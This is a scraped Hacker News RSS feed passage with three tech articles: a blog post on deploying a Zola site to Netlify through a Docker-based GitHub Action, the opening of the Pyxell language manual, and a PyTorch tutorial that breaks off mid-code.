November 11, 2020 | https://sethetter.com/posts/github-actions-with-docker/ | <a href="https://web.archive.org/web/*/https://sethetter.com/posts/github-actions-with-docker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <section>
        <p>I finally decided to dip my toes into GitHub actions recently, for a relatively simple task: build and deploy my personal site. The site is built with <a href="https://getzola.org/">zola</a> and deployed to <a href="https://netlify.com/">netlify</a>.</p>
<p>My needs are pretty straightforward.</p>
<ul>
<li>The zola binary</li>
<li>Node, and <a href="https://www.npmjs.com/package/netlify-cli">netlify-cli</a> installed</li>
<li>Secure way to provide netlify config</li>
</ul>
<p>Then I simply make sure my site source is checked out and run the <code>build</code> and <code>deploy</code> commands.</p>
<h2 id="some-terminology">Some terminology</h2>
<p>An <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/about-actions"><strong>action</strong></a> is a single step that may be performed in a larger <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions"><strong>workflow</strong></a>, which strings together multiple actions and is kicked off in response to various events (like a <code>git push</code>, or a PR). You can have a workflow that calls a single action, but an action can't be used without being called in a workflow.</p>
<h2 id="first-impression-with-actions">First impression with Actions</h2>
<p>I noticed the marketplace approach first of all, and the emphasis on actions that did one small thing which you compose together. This can definitely be a nice approach to things, but my preferred way of working on CI tasks like this is to have access to a Docker container where I have a bit more control of my environment, and can codify it into a familiar Dockerfile.</p>
<p>My thinking is, if I can get this sort of approach to work, I'll have less required domain knowledge of GitHub actions, and can instead just lean on my Docker knowledge to set up whatever operations I may need.</p>
<p>Needless to say, I simply sidestepped the marketplace and found the <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/creating-a-docker-container-action">documentation for utilizing Docker</a>, which thankfully is a valid option! 🎉</p>
<h2 id="my-setup">My setup</h2>
<p>I stumbled through this quite a bit, but ultimately am happy with the approach. I'm able to have a <code>Dockerfile</code> and custom <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>entrypoint.sh</code></a> file that can receive inputs via env vars from the action configuration. I'm also able to pipe secrets, stored in my GitHub repo, into the action from the workflow file.</p>
<h3 id="the-action-file"><a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/action.yml">The action file</a></h3>
<pre><code><span># .github/actions/build-and-deploy/action.yml
</span><span>name</span><span>: </span><span>'</span><span>Build and deploy</span><span>'
</span><span>description</span><span>: </span><span>'</span><span>Build site with Zola and deploy to Netlify</span><span>'
</span><span>inputs</span><span>:
  </span><span>auth_token</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify auth token</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>site_id</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify site ID to deploy to</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>deploy_dir</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Directory to deploy to netlify</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>zola_version</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Version of zola to pull</span><span>'
    </span><span>required</span><span>: </span><span>true
    </span><span>default</span><span>: </span><span>'</span><span>0.12.2</span><span>'
</span><span>runs</span><span>:
  </span><span>using</span><span>: </span><span>'</span><span>docker</span><span>'
  </span><span>image</span><span>: </span><span>'</span><span>Dockerfile</span><span>'
  </span><span>env</span><span>:
    </span><span>ZOLA_VERSION</span><span>: </span><span>${{ inputs.zola_version }}
    NETLIFY_AUTH_TOKEN</span><span>: </span><span>${{ inputs.auth_token }}
    NETLIFY_SITE_ID</span><span>: </span><span>${{ inputs.site_id }}
    NETLIFY_DEPLOY_DIR</span><span>: </span><span>${{ inputs.deploy_dir }}
</span></code></pre>
<p>This file defines our action, which will be called from a workflow which we will configure later. The main thing to notice here is how we are accepting inputs, and passing those on to our Docker container through environment variables.</p>
<p><strong>This was one of the things I stumbled over</strong>. Currently there is no support for passing <a href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg">build args</a> to our Dockerfile, and the environment variables we provide are not available during the build stage, only once the <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>ENTRYPOINT</code></a> is called.</p>
<p>I was stuck on this for a decent chunk of time before realizing that <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/metadata-syntax-for-github-actions#runsargs"><code>runs.args</code> with <code>docker</code> are <em>not</em> build args</a>, they are arguments sent to the <code>entrypoint</code>. Don't make the same mistakes I did!</p>
<p>The implication here is that any steps in your action that require one of these inputs must happen in the <code>ENTRYPOINT</code> provided via <code>env</code>. I'll mention this again shortly.</p>
<h3 id="docker-setup">Docker setup</h3>
<p>The <a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/actions/build-and-deploy/Dockerfile">Dockerfile</a> is pretty minimal, simply setting up the base environment I want, which is <code>node:lts</code> in this case, and then copy in my custom <code>[entrypoint.sh](http://entrypoint.sh)</code> script.</p>
<pre><code><span># .github/actions/build-and-deploy/Dockerfile
</span><span>FROM node:lts
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
</span></code></pre>
<p><strong>Tip!</strong> <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/dockerfile-support-for-github-actions#workdir">Don't set a <code>WORKDIR</code></a>. The action sets the workdir to the <code>$GITHUB_WORKSPACE</code> variable which is where your project source will be located.</p>
<p>All the action happens in the <a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/entrypoint.sh"><code>entrypoint.sh</code></a> file.</p>
<pre><code><span># .github/actions/build-and-deploy/entrypoint.sh

#!/usr/bin/env bash
</span><span>ZOLA_URL=https://github.com/getzola/zola/releases/download/v${ZOLA_VERSION}/zola-v${ZOLA_VERSION}-x86_64-unknown-linux-gnu.tar.gz
curl -L $ZOLA_URL | tar xz -C /usr/local/bin

</span><span># Install netlify
</span><span>npm i -g netlify-cli

</span><span># Kick off build and deploy
</span><span>zola build
netlify deploy \
  --prod \
  --dir=$NETLIFY_DEPLOY_DIR \
 --auth=$NETLIFY_AUTH_TOKEN \
 --site=$NETLIFY_SITE_ID
</span></code></pre>
<p>You can see here we're referencing the <code>env</code> vars we defined in our action file. Originally I had the zola and netlify install steps happening in the <code>Dockerfile</code>, but due to the inability to pass build args to the image, I wasn't able to get the <code>$ZOLA_VERSION</code> passed in. Once I had that realization, it seemed just as viable to put everything in <code>entrypoint.sh</code>.</p>
<h3 id="the-workflow-file"><a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/workflows/build-and-deploy.yml">The workflow file</a></h3>
<pre><code><span># .github/workflows/build-and-deploy.yml
</span><span>name</span><span>: </span><span>build-and-deploy
</span><span>on</span><span>:
  </span><span>push</span><span>:
    </span><span>branches</span><span>: [</span><span>master</span><span>]
</span><span>jobs</span><span>:
  </span><span>build-and-deploy</span><span>:
    </span><span>runs-on</span><span>: </span><span>ubuntu-latest
    steps</span><span>:
      - </span><span>uses</span><span>: </span><span>actions/checkout@v2
      </span><span>- </span><span>uses</span><span>: </span><span>./.github/actions/build-and-deploy
        with</span><span>:
          </span><span>zola_version</span><span>: </span><span>'</span><span>0.12.2</span><span>'
          </span><span>auth_token</span><span>: </span><span>${{ secrets.NETLIFY_AUTH_TOKEN }}
          site_id</span><span>: </span><span>${{ secrets.NETLIFY_SITE_ID }}
          deploy_dir</span><span>: </span><span>'</span><span>public</span><span>'
</span></code></pre>
<p>This is our final configuration file, turning our new custom action into a workflow. We start by setting our workflow triggers in the <code>on</code> block. In this case we just want to run this workflow on pushes to <code>master</code>.</p>
<p>Next is our <code>jobs</code> block. We can define multiple jobs which would all run in parallel. If we need anything serial, it should happen within a single job. In our case, we have just one job with two actions.</p>
<p>The job itself starts with the checkout action, which handles checking out the repo's source into the job workspace, then we call our custom action by providing a path to the action folder.</p>
<p>In our <code>with</code> block we provide values for the inputs we defined on our action. You'll notice that two of the values are provided via <code>secrets</code>, which is a <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets">feature of GitHub</a> I wasn't aware of before this. It's very easy to work with!</p>
<h2 id="room-for-improvement">Room for improvement</h2>
<p>I think the main drawback here is potentially slow job run times, since we're installing our dependencies each time. Depending on what's actually slow, there are a number of ways it could be addressed.</p>
<p>In general, finding a base Docker image that has as much of what you need as possible (without too much bloat) is going to help. Maintaining your own images in a registry somewhere comes with it's own overhead, but that's also an option.</p>
<p>I'm sure using the marketplace approach could also be a way to address the performance issues, assuming you find actions that have your dependencies installed and configured appropriately, but the goal of this post was to explore a minimal action configuration while leveraging the power of Docker 😄.</p>
<p><strong>That's it!</strong> 👋</p>

    </section>
</article></div>]]>
            </description>
            <link>https://sethetter.com/posts/github-actions-with-docker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066079</guid>
            <pubDate>Thu, 12 Nov 2020 03:28:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pyxell – a programming language that combines Python's elegance with C++'s speed]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066058">thread link</a>) | @masijo
<br/>
November 11, 2020 | https://www.pyxell.org/docs/manual.html | <a href="https://web.archive.org/web/*/https://www.pyxell.org/docs/manual.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>Pyxell [<em>pixel</em>] is a multi-paradigm, statically typed programming language, compiled to machine code via C++.</p> <p>This manual should let you quickly learn all the details to start programming in Pyxell.
It is assumed that you already know some programming language (preferably Python), since basic programming concepts are not explained here.</p> <p>You are encouraged to run the code snippets and experiment with them for yourself.
To run Pyxell code, go to the <a href="https://www.pyxell.org/docs/playground.html">Playground</a>,
clone the repository and follow the instructions on <a href="https://github.com/adamsol/Pyxell#requirements" target="_blank" rel="noopener noreferrer">Github<span> <span>(opens new window)</span></span></a>,
or download Windows binaries from the <a href="https://github.com/adamsol/Pyxell/releases" target="_blank" rel="noopener noreferrer">Releases<span> <span>(opens new window)</span></span></a>.</p> <h2 id="hello-world"><a href="#hello-world">#</a> Hello, world!</h2> <p>If you can run the following code and see the message on the screen, you are ready to start.</p> <h2 id="variables-and-types"><a href="#variables-and-types">#</a> Variables and types</h2> <h3 id="variable-declaration"><a href="#variable-declaration">#</a> Variable declaration</h3> <p>Pyxell is statically typed. Variables have types assigned during compilation.
In most cases, type of an expression is automatically inferred and the value can be directly assigned to a variable.</p> <p>In other cases, when the type cannot be inferred or you want to declare a variable without initializing it, you can set the type explicitly.
When not directly initialized, variable is automatically initialized with the default value for a given type.
You can find the list of all available types and their default values in the <a href="https://www.pyxell.org/docs/specification.html#types">Specification</a>.</p> <p>Variable name must start with a letter, but may also contain digits, underscores, and apostrophes.
Once a variable has been created, its type cannot be changed.</p> <h3 id="type-coercion"><a href="#type-coercion">#</a> Type coercion</h3> <p>Values of some types can be automatically converted to more general types: <code>Int -&gt; Rat -&gt; Float</code> or <code>Char -&gt; String</code>.</p> <p>The coercion doesn't work in the other direction.</p> <h2 id="arithmetic-and-logic"><a href="#arithmetic-and-logic">#</a> Arithmetic and logic</h2> <h3 id="numbers"><a href="#numbers">#</a> Numbers</h3> <p>Standard integers in Pyxell have 64 bits of precision and range from <code>-2^63</code> to <code>2^63-1</code>.
Binary, octal, and hexadecimal literals are supported.</p> <p>Rational numbers have unlimited precision.
They can be written either as integers with <code>r</code> suffix, or non-integers in decimal form.
They are also created as the result of division or exponentiation
(to obtain an integer from a division or exponentiation, use lossy <code>//</code> and <code>^^</code> operators).</p> <p>You can retrieve the numerator and denominator from a rational number.</p> <p>Floating-point numbers have 64 bits of precision and follow the IEEE 754 standard.
They can be written with <code>f</code> suffix or in scientific notation.</p> <p>Underscores can be additionally used in all numeric literals, to enhance readability of long numbers.</p> <h3 id="boolean-values"><a href="#boolean-values">#</a> Boolean values</h3> <p>There are two boolean values: <code>true</code> and <code>false</code>.
Logical negation and short-circuiting conjunction and disjunction operators are available.</p> <p>Boolean values are most often obtained in the result of comparisons.
When comparison operators are chained, they behave as if connected with <code>and</code> operator.</p> <h2 id="characters-and-strings"><a href="#characters-and-strings">#</a> Characters and strings</h2> <h3 id="characters"><a href="#characters">#</a> Characters</h3> <p>Characters are written in single quotes.</p> <p>You can get character's ASCII code, as well as obtain character corresponding to a given integer.</p> <p>You can also perform some arithmetic operations on characters.</p> <h3 id="strings"><a href="#strings">#</a> Strings</h3> <p>Strings are immutable sequences of characters. They are written in double quotes.</p> <p>You can access string's length, as well as its individual characters. Negative indexing and slicing is also supported, like in Python.</p> <p>Strings can be concatenated with <code>+</code> operator and repeated with <code>*</code> operator.</p> <p>You can construct formatted strings using interpolation syntax.</p> <h2 id="control-flow"><a href="#control-flow">#</a> Control flow</h2> <p>Pyxell uses indentation-based syntax, similar to Python's. Only spaces are allowed (tab character will cause a syntax error).
Rather than <code>:</code> character, Pyxell uses <code>do</code> keyword for indicating beginning of a block, and <code>def</code> keyword for function and class definitions.
The scope of a variable declared in a block is limited to that block.</p> <h3 id="if-statement"><a href="#if-statement">#</a> <code>if</code> statement</h3> <p>The first branch whose condition evaluates to <code>true</code> is executed.</p> <h3 id="while-loop"><a href="#while-loop">#</a> <code>while</code> loop</h3> <p>The loop runs while the condition is satisfied.</p> <h3 id="until-loop"><a href="#until-loop">#</a> <code>until</code> loop</h3> <p>This loop is similar to <code>while</code> loop, but it is always executed at least once and runs until the condition is satisfied.</p> <h3 id="for-loop"><a href="#for-loop">#</a> <code>for</code> loop</h3> <p>It can be used to loop over ranges (of numbers or characters) and other iterables.
Range can be inclusive (<code>a..b</code>), exclusive (<code>a...b</code>), or infinite (<code>a...</code>).</p> <p>You can optionally provide a step value, which can be either positive or negative (it is 1 by default).</p> <p>It is possible to loop over multiple iterables at once and provide custom step values to any of them.</p> <h3 id="continue-and-break"><a href="#continue-and-break">#</a> <code>continue</code> and <code>break</code></h3> <p>Inside loops you can use statements to exit the current iteration or the whole loop.</p> <h2 id="containers"><a href="#containers">#</a> Containers</h2> <h3 id="arrays"><a href="#arrays">#</a> Arrays</h3> <p>Arrays are similar to strings, but they are mutable and can have elements of any type.</p> <p>Containers have reference semantics, so they are not implicitly copied when variables are passed.
Mutation of one instance is reflected in all other instances of the same container.</p> <p>When an empty array is used, its type must be explicitly given.</p> <p>Arrays can be concatenated, repeated, and compared using standard operators.</p> <p>You can use array comprehension, as well as range literals and spread operator with optional step.</p> <p>For type safety, containers in Pyxell are invariant, which means they cannot be implicitly converted to another type,
even if types of the elements match (see <a href="https://stackoverflow.com/q/2745265" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> for a broader explanation).
However, container literals can be automatically converted.</p> <h3 id="sets"><a href="#sets">#</a> Sets</h3> <p>Sets contain no duplicates and do not preserve order of elements.</p> <p>Empty set can be created like an empty array.</p> <p>To check if an element is in the set, use <code>in</code> operator.</p> <p>There exist operators for set union, difference, and intersection.</p> <p>Like with arrays, you can use comprehensions, ranges, and spread syntax to create sets.</p> <p>Containers are not hashable, so they cannot be stored in sets.</p> <h3 id="dictionaries"><a href="#dictionaries">#</a> Dictionaries</h3> <p>Dictionaries are hash maps. Like sets, they do not preserve order of elements.
They work similarly to <code>defaultdict</code> in Python: if a key is not present, the default value for a given type is automatically created in the dictionary.</p> <p>Empty dictionary literal has an additional colon.</p> <p>Use <code>in</code> operator for checking if the dictionary contains a given key.</p> <p>Dictionaries can be merged with <code>+</code> operator. In the case of repeated keys, the second value wins.</p> <p>Dictionary comprehension works similarly to array and set comprehension.</p> <p>When iterated over, dictionaries produce pairs of key and value.</p> <p>Spread operator for dictionaries consists of an extra colon.</p> <h2 id="nullable-types"><a href="#nullable-types">#</a> Nullable types</h2> <p>To accept <code>null</code> value, variable's type must be explicitly marked as nullable.</p> <p>You can either directly check if a value is <code>null</code>, or use special coalescing and conditional operators.</p> <p>There is also an operator to directly retrieve the value, for cases when you are sure it is not null.</p> <h2 id="tuples"><a href="#tuples">#</a> Tuples</h2> <p>Two or more values separated with a comma (outside of a container, function call, and print statement) form a tuple.</p> <p>Values can be retrieved using alphabetical properties or tuple destructuring (unneeded part can be discarded with an underscore).</p> <p>Tuples are mutable, but they have value semantics, so they are hashable and can be passed around as if they were immutable.</p> <h2 id="functions"><a href="#functions">#</a> Functions</h2> <h3 id="function-definition-and-call"><a href="#function-definition-and-call">#</a> Function definition and call</h3> <p>Basic definition of a function consists of its name, list of arguments, return type, and body.</p> <p>When a function does not return anything, the return type may be written as <code>Void</code> or may be omitted completely.</p> <p>You can provide default values for optional arguments.
The expressions will be evaluated every time the function is called (if they are needed), so mutable container literals can be safely used.</p> <p>Arguments can be also passed in any order using their names.</p> <p>Variadic functions are supported too. This is just a syntactic sugar for passing an array.
Ranges and spread syntax can be used when such a function is called.</p> <p>Functions can be stored in variables, passed to other functions as arguments, etc.
However, when a function is converted to a variable, all information about its arguments except for their types is lost.</p> <h3 id="generic-functions"><a href="#generic-functions">#</a> Generic functions</h3> <p>Generic functions are standard functions with additional type variables, which can be used just like normal types.
They are compiled independently for each combination of types they are called with.</p> <p>Function declaration may contain default values for generic arguments, and the body may contain any code dependent on the real types.
Errors will be reported when the function cannot be compiled with given types.</p> <p>When a type name is used more than once, the compiler will try to unify types of the arguments, following the coercion rules.</p> <h3 id="lambda-functions"><a href="#lambda-functions">#</a> Lambda functions</h3> <p>Lambda is a simpler version of generic function, where all arguments, as well as the return type, are generic.</p> <p>You can use placeholder syntax to write even more concise functions. Each underscore corresponds to one argument.</p> <p>Placeholder resolving doesn't run through function calls by default (placeholders inside a function call form their own functions for corresponding arguments).
To create a partial function, add <code>@</code> character.</p> <p>Lambdas can also be multi-line, so that you can define normal functions without any type annotations.</p> <p>Note that lambda functions currently work only with arguments of known types.
You cannot pass a lambda function to another lambda function.
In the case of functional arguments, it's better to use the full generic definition instead.</p> <h3 id="generators"><a href="#generators">#</a> Generators</h3> <p>Generator is a function producing a sequence of values that can be iterated over without storing it in memory.
To create a generator, add an asterisk symbol to the function definition.</p> <p>Lambdas can be generators as well.</p> <p>Note that generators are currently supported only with Clang.</p> <h2 id="classes"><a href="#classes">#</a> Classes</h2> <h3 id="class-definition-and-object-construction"><a href="#class-definition-and-object-construction">#</a> Class definition and object construction</h3> <p>Definition of a class consists of its name and list of fields.
Each field may have an explicit default value; if not provided, it will be the default value for a given type.</p> <p>Every class has a default constructor function that accepts field values in the order of definition, or as named arguments.
Fields not directly initialized will receive their default values.</p> <p>Remember that class objects must always be explicitly constructed before use (they have no valid default …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pyxell.org/docs/manual.html">https://www.pyxell.org/docs/manual.html</a></em></p>]]>
            </description>
            <link>https://www.pyxell.org/docs/manual.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066058</guid>
            <pubDate>Thu, 12 Nov 2020 03:25:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Guide to PyTorch for Data Scientists]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065771">thread link</a>) | @shirappu
<br/>
November 11, 2020 | https://mlwhiz.com/blog/2020/09/09/pytorch_guide/ | <a href="https://web.archive.org/web/*/https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>PyTorch</strong></em> has sort of became one of the de facto standards for creating Neural Networks now, and I love its interface. Yet, it is somehow a little difficult for beginners to get a hold of.</p><p>I remember picking PyTorch up only after some extensive experimentation a couple of years back. To tell you the truth, it took me a lot of time to pick it up but am I glad that I moved from
<a href="https://towardsdatascience.com/moving-from-keras-to-pytorch-f0d4fff4ce79" target="_blank" rel="nofollow noopener">Keras to PyTorch</a>
. With its high customizability and pythonic syntax,PyTorch is just a joy to work with, and I would recommend it to anyone who wants to do some heavy lifting with Deep Learning.</p><p>So, in this PyTorch guide, <em><strong>I will try to ease some of the pain with PyTorch for starters</strong></em> and go through some of the most important classes and modules that you will require while creating any Neural Network with Pytorch.</p><p>But, that is not to say that this is aimed at beginners only as <em><strong>I will also talk about the</strong></em> <em><strong>high customizability PyTorch provides and will talk about custom Layers, Datasets, Dataloaders, and Loss functions</strong></em>.</p><p>So let’s get some coffee ☕ ️and start it up.</p><hr><h2 id="tensors">Tensors</h2><p>Tensors are the basic building blocks in PyTorch and put very simply, they are NumPy arrays but on GPU. In this part, I will list down some of the most used operations we can use while working with Tensors. This is by no means an exhaustive list of operations you can do with Tensors, but it is helpful to understand what tensors are before going towards the more exciting parts.</p><h3 id="1-create-a-tensor">1. Create a Tensor</h3><p>We can create a PyTorch tensor in multiple ways. This includes converting to tensor from a NumPy array. Below is just a small gist with some examples to start with, but you can do a whole lot of
<a href="https://pytorch.org/docs/stable/tensors.html" target="_blank" rel="nofollow noopener">more things</a>
with tensors just like you can do with NumPy arrays.</p><div><pre><code data-lang="py"><span># Using torch.Tensor</span>
t <span>=</span> torch<span>.</span>Tensor([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
<span>print</span>(f<span>"Created Tensor Using torch.Tensor:</span><span>\n</span><span>{t}"</span>)

<span># Using torch.randn</span>
t <span>=</span> torch<span>.</span>randn(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.randn:</span><span>\n</span><span>{t}"</span>)

<span># using torch.[ones|zeros](*size)</span>
t <span>=</span> torch<span>.</span>ones(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.ones:</span><span>\n</span><span>{t}"</span>)
t <span>=</span> torch<span>.</span>zeros(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.zeros:</span><span>\n</span><span>{t}"</span>)

<span># using torch.randint - a tensor of size 4,5 with entries between 0 and 10(excluded)</span>
t <span>=</span> torch<span>.</span>randint(low <span>=</span> <span>0</span>,high <span>=</span> <span>10</span>,size <span>=</span> (<span>4</span>,<span>5</span>))
<span>print</span>(f<span>"Created Tensor Using torch.randint:</span><span>\n</span><span>{t}"</span>)

<span># Using from_numpy to convert from Numpy Array to Tensor</span>
a <span>=</span> np<span>.</span>array([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
t <span>=</span> torch<span>.</span>from_numpy(a)
<span>print</span>(f<span>"Convert to Tensor From Numpy Array:</span><span>\n</span><span>{t}"</span>)

<span># Using .numpy() to convert from Tensor to Numpy array</span>
t <span>=</span> t<span>.</span>numpy()
<span>print</span>(f<span>"Convert to Numpy Array From Tensor:</span><span>\n</span><span>{t}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/0.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><h3 id="2-tensor-operations">2. Tensor Operations</h3><p>Again, there are a lot of operations you can do on these tensors. The full list of functions can be found
<a href="https://pytorch.org/docs/stable/torch.html?highlight=mm#math-operations" target="_blank" rel="nofollow noopener">here</a>
.</p><div><pre><code data-lang="py">A <span>=</span> torch<span>.</span>randn(<span>3</span>,<span>4</span>)
W <span>=</span> torch<span>.</span>randn(<span>4</span>,<span>2</span>)
<span># Multiply Matrix A and W</span>
t <span>=</span> A<span>.</span>mm(W)
<span>print</span>(f<span>"Created Tensor t by Multiplying A and W:</span><span>\n</span><span>{t}"</span>)
<span># Transpose Tensor t</span>
t <span>=</span> t<span>.</span>t()
<span>print</span>(f<span>"Transpose of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># Square each element of t</span>
t <span>=</span> t<span>**</span><span>2</span>
<span>print</span>(f<span>"Square each element of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># return the size of a tensor</span>
<span>print</span>(f<span>"Size of Tensor t using .size():</span><span>\n</span><span>{t.size()}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/1.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p><strong>Note:</strong> What are PyTorch Variables? In the previous versions of Pytorch, Tensor and Variables used to be different and provided different functionality, but now the Variable API is
<a href="https://pytorch.org/docs/stable/autograd.html#variable-deprecated" target="_blank" rel="nofollow noopener">deprecated</a>
, and all methods for variables work with Tensors. So, if you don’t know about them, it’s fine as they re not needed, and if you know them, you can forget about them.</p><hr><h2 id="the-nnmodule">The nn.Module</h2><p>Photo by
<a href="https://unsplash.com/@fernanddecanne?utm_source=medium&amp;utm_medium=referral" target="_blank" rel="nofollow noopener">Fernand De Canne</a>
on
<img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1200x0_resize_box_2.png 1200w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1500x0_resize_box_2.png 1500w" src="https://mlwhiz.com/images/pytorch_guide/2.png" alt="<a href=&quot;https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;>Unsplash</a>"></p><p>Here comes the fun part as we are now going to talk about some of the most used constructs in Pytorch while creating deep learning projects. nn.Module lets you create your Deep Learning models as a class. You can inherit from nn.Moduleto define any model as a class. Every model class necessarily contains an<code> __init__</code> procedure block and a block for the <code>forward</code> pass.</p><ul><li><p>In the <code>__init__</code> part, the user can define all the layers the network is going to have but doesn’t yet define how those layers would be connected to each other.</p></li><li><p>In the <code>forward</code> pass block, the user defines how data flows from one layer to another inside the network.</p></li></ul><p>So, put simply, any network we define will look like:</p><div><pre><code data-lang="py"><span>class</span> <span>myNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)
    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        x <span>=</span> self<span>.</span>lin2(x)
        <span>return</span> x
</code></pre></div><p>Here we have defined a very simple Network that takes an input of size 784 and passes it through two linear layers in a sequential manner. But the thing to note is that we can define any sort of calculation while defining the forward pass, and that makes PyTorch highly customizable for research purposes. For example, in our crazy experimentation mode, we might have used the below network where we arbitrarily attach our layers. Here we send back the output from the second linear layer back again to the first one after adding the input to it(skip connection) back again(I honestly don’t know what that will do).</p><div><pre><code data-lang="py"><span>class</span> <span>myCrazyNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>784</span>)
        self<span>.</span>lin3 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x_lin1 <span>=</span> self<span>.</span>lin1(x)
        x_lin2 <span>=</span> x <span>+</span> self<span>.</span>lin2(x_lin1)
        x_lin2 <span>=</span> self<span>.</span>lin1(x_lin2)
        x <span>=</span> self<span>.</span>lin3(x_lin2)
        <span>return</span> x
</code></pre></div><p>We can also check if the neural network forward pass works. I usually do that by first creating some random input and just passing that through the network I have created.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCrazyNeuralNet()
model(x)<span>.</span>size()
<span>--------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><hr><h2 id="a-word-about-layers">A word about Layers</h2><p>Pytorch is pretty powerful, and you can actually create any new experimental layer by yourself using <code>nn.Module</code>. For example, rather than using the predefined Linear Layer <code>nn.Linear</code> from Pytorch above, we could have created our <strong>custom linear layer</strong>.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomLinearLayer</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self,in_size,out_size):
        super()<span>.</span>__init__()
